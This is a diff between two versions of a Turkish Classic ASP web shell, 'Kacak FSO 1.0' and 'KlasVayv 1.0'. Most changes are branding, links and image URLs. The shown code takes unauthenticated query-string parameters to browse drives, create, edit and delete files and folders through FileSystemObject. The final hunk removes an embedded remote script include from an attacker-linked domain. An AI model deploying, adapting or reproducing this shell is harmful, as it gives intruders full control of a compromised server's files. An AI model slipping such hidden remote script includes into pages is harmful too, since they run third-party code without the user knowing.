@@ -1,10 +1,11 @@
 <html>
+
 <head>
 <meta http-equiv="Content-Language" content="tr">
 <meta name="GENERATOR" content="Microsoft FrontPage 5.0">
 <meta name="ProgId" content="FrontPage.Editor.Document">
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
-<title>Kacak FSO 1.0 | Terrorist Crew - Saldiri.Org</title>
+<title>Aventis KlasVayv 1.0</title>
 </head>
 
 <body topmargin="0" leftmargin="0" bgcolor="#EAEAEA">
@@ -18,9 +19,9 @@ function MM_openBrWindow(theURL,winName,features) { //v2.0
 </script>
 
 <%
-if request.querystring("TGH") = "1" then
+if request.querystring("usklas") = "1" then
 on error resume next
-es=request.querystring("Kacak")
+es=request.querystring("klas")
 diez=server.urlencode(left(es,(instrRev(es,"\"))-1))
 
 Select case es
@@ -38,7 +39,7 @@ end select
 
 
 <body topmargin="0" leftmargin="0"
-onLoad="location.href='?klas=<%=diez%>&usak=1'">
+onLoad="location.href='klasvayv.asp?klas=<%=diez%>&usak=1'">
 
 <%
 else
@@ -47,7 +48,7 @@ else
 
 
 <%
-if request.querystring("Dosyakaydet") <> "" then
+if request.querystring("dosyakaydet") <> "" then
 set kaydospos=createobject("scripting.filesystemobject")
 set	kaydoses=kaydospos.createtextfile(request.querystring("dosyakaydet") & request("dosadi"))
 set kaydoses=nothing
@@ -72,25 +73,25 @@ if request.querystring("yenidosya") <> "" then
   <tr>
     <td width="70" bgcolor="#000000" height="76">
     <p align="center">
-    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
     <td width="501" bgcolor="#000000" height="76" valign="top">
     <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
     <span style="font-weight: 700">
     <br>
-    Kacak ©<br>
-    </span>Terrorist Crew<br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliştirme Grubu<br>
     <span style="font-weight: 700">
     <br>
-    KACAK FSO 1.0</span></font></td>
+    KlasVayv 1.0</span></font></td>
     <td width="431" bgcolor="#000000" height="76" valign="top">
     <p align="right"><span style="font-weight: 700">
     <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
     </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
-    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
-    <font color="#858585">GrayHatz ~ TurkGuvenligi.İnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
     </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
-    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
-    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hotmail.com" style="text-decoration: none"><font color="#858585">@GrayHatz ~ TurkGuvenligi.İnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
   </tr>
   <tr>
     <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
@@ -122,7 +123,7 @@ if request.querystring("yenidosya") <> "" then
   </tr>
   <tr>
     <td width="100%" bgcolor="#B7B7B7">
-    <form method="POST" action="?dosyakaydet=<%=request.querystring("yenidosya")%>&klas=<%=request.querystring("yenidosya")%>" name="kaypos">
+    <form method="POST" action="klasvayv.asp?dosyakaydet=<%=request.querystring("yenidosya")%>&klas=<%=request.querystring("yenidosya")%>" name="kaypos">
 <p align="center"><b><font size="1" face="Verdana">
 <br>
 Dosya Adı : <br>
@@ -208,25 +209,25 @@ set aktifklas=request.querystring("aktifklas")
   <tr>
     <td width="70" bgcolor="#000000" height="76">
     <p align="center">
-    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
     <td width="501" bgcolor="#000000" height="76" valign="top">
     <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
     <span style="font-weight: 700">
     <br>
-    <center>Kacak ©<br>
-    </span>Terrorist Crew<br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliştirme Grubu<br>
     <span style="font-weight: 700">
     <br>
-    KACAK FSO 1.0</span></font></td>
+    KlasVayv 1.0</span></font></td>
     <td width="431" bgcolor="#000000" height="76" valign="top">
     <p align="right"><span style="font-weight: 700">
     <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
     </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
-    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
-    <font color="#858585">GrayHatz ~ TurkGuvenligi.İnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
     </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
-    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
-    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
   </tr>
   </table>
 
@@ -259,7 +260,7 @@ set aktifklas=request.querystring("aktifklas")
   </tr>
   <tr>
     <td width="100%" bgcolor="#C5C5C5" height="134">
-    <form method="POST" action="?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>" name="klaspos">
+    <form method="POST" action="klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>" name="klaspos">
 <p align="center"><font
                 color="#FFFFFF" size="1" face="Arial">
 <input
@@ -300,25 +301,25 @@ if request.querystring("suruculer") <> "" then
   <tr>
     <td width="70" bgcolor="#000000" height="76">
     <p align="center">
-    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
     <td width="501" bgcolor="#000000" height="76" valign="top">
     <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
     <span style="font-weight: 700">
     <br>
-    Kacak ©<br>
-    </span>Terrorist Crew<br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliştirme Grubu<br>
     <span style="font-weight: 700">
     <br>
-    KACAK FSO 1.0</span></font></td>
+    KlasVayv 1.0</span></font></td>
     <td width="431" bgcolor="#000000" height="76" valign="top">
     <p align="right"><span style="font-weight: 700">
     <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
     </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
-    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
-    <font color="#858585">www.kacaq.blogspot.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
     </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
-    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
-    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
   </tr>
   <tr>
     <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
@@ -403,7 +404,7 @@ if request.querystring("suruculer") <> "" then
           style="CURSOR: hand"
           
           >
-          <a href="?klas=<%=dongu.driveletter%>:\" style="text-decoration: none">
+          <a href="klasvayv.asp?klas=<%=dongu.driveletter%>:\" style="text-decoration: none">
           <font face="Verdana" style="font-size: 8pt" color="#000000">Gir</font></a></td>
             </tr>
           </table>
@@ -487,25 +488,25 @@ set aktifklas=request.querystring("klas")
   <tr>
     <td width="70" bgcolor="#000000" height="76">
     <p align="center">
-    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
     <td width="501" bgcolor="#000000" height="76" valign="top">
     <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
     <span style="font-weight: 700">
     <br>
-    Kacak©<br>
-    </span>Terrorist Crew<br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliştirme Grubu<br>
     <span style="font-weight: 700">
     <br>
-    KACAK FSO 1.0</span></font></td>
+    KlasVayv 1.0</span></font></td>
     <td width="431" bgcolor="#000000" height="76" valign="top">
     <p align="right"><span style="font-weight: 700">
     <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
     </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
-    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
-    <font color="#858585">www.kacaq.blogspot.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
     </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
-    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
-    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
   </tr>
   <tr>
     <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
@@ -537,7 +538,7 @@ set aktifklas=request.querystring("klas")
   </tr>
   <tr>
     <td width="100%" bgcolor="#000000">
-    <form method="POST" action="?kaydet=<%=request.querystring("duzenle")%>&klas=<%=aktifklas%>" name="kaypos">
+    <form method="POST" action="klasvayv.asp?kaydet=<%=request.querystring("duzenle")%>&klas=<%=aktifklas%>" name="kaypos">
 <p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
           <textarea name="duzenx" 
           style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
@@ -553,7 +554,7 @@ set aktifklas=request.querystring("klas")
 		<input type="submit" size="16"
 		name="duzenx1" value="Kaydet"
 		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
-		</span><a href=""><input type="reset" size="16"
+		</span><a href="klasvayv.asp"><input type="reset" size="16"
 		name="x" value="Vazgeç"
 		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
 		</span></a></td>
@@ -634,25 +635,25 @@ Set dosyalar = klasor.files
   <tr>
     <td width="70" bgcolor="#000000" height="76">
     <p align="center">
-    <img border="0" src="http://img509.imageshack.us/img509/2842/spartaqt5.jpg"></td>
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
     <td width="501" bgcolor="#000000" height="76" valign="top">
     <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
     <span style="font-weight: 700">
     <br>
-    Kacak ©<br><br>
-    </span>Terrorist Crew<br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliştirme Grubu<br>
     <span style="font-weight: 700">
     <br>
-    KACAK FSO 1.0</span></font></td>
+    KlasVayv 1.0</span></font></td>
     <td width="431" bgcolor="#000000" height="76" valign="top">
     <p align="right"><span style="font-weight: 700">
     <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
     </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
-    <a href="www.kacaq.blogspot.com" style="text-decoration: none">
-    <font color="#858585">www.kacaq.blogspot.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
     </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
-    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
-    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
   </tr>
   <tr>
     <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
@@ -671,7 +672,7 @@ Set dosyalar = klasor.files
                 <td width="100%" bgcolor="#B7B7B7" bordercolor="#9F9F9F" height="13">
                 <p align="center"><font face="Verdana" style="font-size: 8pt">
 
-                <a href="?usklas=1&klas=<%=server.urlencode(left(aktifklas,(instrRev(aktifklas,"\"))-1))%>" style="text-decoration: none">
+                <a href="klasvayv.asp?usklas=1&klas=<%=server.urlencode(left(aktifklas,(instrRev(aktifklas,"\"))-1))%>" style="text-decoration: none">
                 <font color="#000000">Üst Klasör</font></a></font></td>
                 
               </tr>
@@ -707,7 +708,7 @@ Set dosyalar = klasor.files
         height="19" bordercolor="#000000">
         <span style="font-weight: 700">
         <font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
-        <a href="?suruculer=1" style="text-decoration: none">
+        <a href="klasvayv.asp?suruculer=1" style="text-decoration: none">
         <font color="#9F9F9F">Sürücüler</font></a></font></span></td>
           </tr>
         </table>
@@ -721,7 +722,7 @@ Set dosyalar = klasor.files
         style="CURSOR: hand"
         bordercolor="#000000">
         <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
-        <a href="?klasac=1&aktifklas=<%=aktifklas%>" style="text-decoration: none">
+        <a href="klasvayv.asp?klasac=1&aktifklas=<%=aktifklas%>" style="text-decoration: none">
         <font color="#9F9F9F">Yeni Klasör</font></a></font></td>
           </tr>
         </table>
@@ -735,7 +736,7 @@ Set dosyalar = klasor.files
         style="CURSOR: hand"
 		bordercolor="#000000">
         <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
-        <a href="?yenidosya=<%=aktifklas%>" style="text-decoration: none"><font color="#9F9F9F">Yeni Dosya</font></a> </font></td>
+        <a href="klasvayv.asp?yenidosya=<%=aktifklas%>" style="text-decoration: none"><font color="#9F9F9F">Yeni Dosya</font></a> </font></td>
           </tr>
         </table>
         </td>
@@ -769,7 +770,7 @@ Set dosyalar = klasor.files
   <tr>
     <td width="30" height="17" bgcolor="#808080">
     <p align="center">
-    <img border="0" src="http://turkguvenligi.info/blues/statusicon/forum_new.gif"></td>
+    <img border="0" src="http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif"></td>
     <td height="17" bgcolor="#C4C4C4">
     <font face="Verdana" style="font-size: 8pt">&nbsp;<%=oge.name%>&nbsp;</font></td>
     <td width="61" height="17" bgcolor="#C4C4C4" align="center">
@@ -782,7 +783,7 @@ Set dosyalar = klasor.files
 		height="20">
 
         <p align="center"><font face="Verdana" style="font-size: 8pt">
-        <a href="?klas=<%=aktifklas%><%=oge.name%>\" style="text-decoration: none">
+        <a href="klasvayv.asp?klas=<%=aktifklas%><%=oge.name%>\" style="text-decoration: none">
         <font color="#000000">Aç</font></a></font></td>
       </tr>
     </table>
@@ -799,7 +800,7 @@ Set dosyalar = klasor.files
 		height="20">
 
         <p align="center"><font face="Verdana" style="font-size: 8pt">
-        <a href="?silklas=<%=aktifklas & oge.name & "&klas=" & aktifklas %>" style="text-decoration: none">
+        <a href="klasvayv.asp?silklas=<%=aktifklas & oge.name & "&klas=" & aktifklas %>" style="text-decoration: none">
         <font color="#000000">Sil</font></a>
 
         </font></td>
@@ -818,7 +819,7 @@ Set dosyalar = klasor.files
   <tr>
     <td width="30" height="1" bgcolor="#B0B0B0">
     <p align="center">
-    <img border="0" src="http://turkguvenligi.info/blues/statusicon/forum_new.gif"></td>
+    <img border="0" src="http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif"></td>
     <td height="1" bgcolor="#EAEAEA">
     <font face="Verdana" style="font-size: 8pt">&nbsp;<%=oge.name%> </font>
     <font face="Arial Narrow" style="font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ( <%=Round(oge.size/1024,1)%> KB )&nbsp;</font></td>
@@ -832,7 +833,7 @@ Set dosyalar = klasor.files
 		height="20">
 
         <p align="center"><font face="Verdana" style="font-size: 8pt">
-        <a style="text-decoration: none" target="_self" href="?duzenle=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>">
+        <a style="text-decoration: none" target="_self" href="klasvayv.asp?duzenle=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>">
         <font color="#000000">Düzenle</font></a></font></td>
       </tr>
     </table>
@@ -847,7 +848,7 @@ Set dosyalar = klasor.files
 		height="20">
 
         <p align="center"><font face="Verdana" style="font-size: 8pt">
-        <a href="?sildos=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>" style="text-decoration: none">
+        <a href="klasvayv.asp?sildos=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>" style="text-decoration: none">
         <font color="#000000">Sil</font></a></font></td>
       </tr>
     </table>
@@ -887,7 +888,8 @@ end if
 <%
 end if
 %>
-<SCRIPT SRC=http://www.saldiri.org/summer/ciz.js></SCRIPT>
+
+
 <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber29">
   <tr>
     <td width="100%" bgcolor="#000000">&nbsp;</td>
